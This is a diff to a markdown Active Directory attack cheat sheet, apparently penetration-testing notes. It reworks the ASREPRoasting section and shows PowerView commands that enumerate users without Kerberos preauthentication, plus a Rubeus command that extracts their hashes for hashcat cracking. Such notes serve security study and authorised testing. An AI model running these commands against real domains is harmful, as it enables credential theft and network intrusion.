@@ -43,16 +43,14 @@ Enter-PSSession $dc
 (PowerView)> Get-DomainUser * | Select-Object samaccountname,description | Where-Object {$_.Description -ne $null}
 ```
 
-# ASREPRoasting
-
-Using **Rubeus** to extract hashes.
+ # ASREPRoasting
 
 **DONT_REQ_PREAUTH** attribute user account
 
-## Enumerate
+## Get users with DONT_REQ_PREAUTH attribute
 
 ```powershell
-Get-DomainUser -PreauthNotRequired | select samaccountname, userprincipalname, useraccountcontrol | fl
+(PowerView)> Get-DomainUser -PreauthNotRequired | select samaccountname, userprincipalname, useraccountcontrol | fl
 ```
 ```
 .\Rubeus.exe asreproast /user:<USER> /nowrap /format:hashcat
